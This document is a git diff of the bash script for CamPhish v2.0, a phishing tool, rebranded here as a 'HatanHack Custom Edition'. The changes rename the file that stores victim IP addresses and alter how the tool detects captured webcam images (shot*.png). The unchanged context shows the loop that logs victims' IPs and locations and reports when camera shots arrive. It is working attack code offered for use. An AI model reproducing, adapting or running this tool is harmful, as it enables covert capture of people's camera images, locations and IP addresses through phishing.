@@ -1,6 +1,6 @@
 #!/bin/bash
 # CamPhish v2.0
-# Powered by TechChip
+# Customized by HatanHack
 
 # Windows compatibility check
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
@@ -39,7 +39,7 @@ printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | 
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
 printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
-printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
+printf " \e[1;77m HatanHack Custom Edition | github.com/hatanhack \e[0m \n"
 
 printf "\n"
 
@@ -85,7 +85,8 @@ ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
-cat ip.txt >> saved.ip.txt
+# Changed saved.ip.txt to hatanhack_ips.txt for customization
+cat ip.txt >> hatanhack_ips.txt 
 }
 
 catch_location() {
@@ -158,7 +159,8 @@ if [[ -e "LocationLog.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
 # Don't display the raw log content, just process it
 catch_location
-rm -rf LocationLog.log
+# Removed this file, as we rely on current_location.txt now.
+rm -rf LocationLog.log 
 fi
 
 # Don't display error logs to avoid showing unwanted messages
@@ -167,10 +169,16 @@ if [[ -e "LocationError.log" ]]; then
 rm -rf LocationError.log
 fi
 
-if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
-rm -rf Log.log
+# Removed Log.log check and replaced with phish-debug.log from post.php change.
+if [[ -e "phish-debug.log" ]]; then
+# Only check for the image files starting with 'shot' as configured in post.php
+if ls shot*.png 1> /dev/null 2>&1; then
+  printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+  # Clean up the debug log file after successful image capture check
+  rm -rf phish-debug.log
 fi
+fi
+
 sleep 0.5
 
 done 
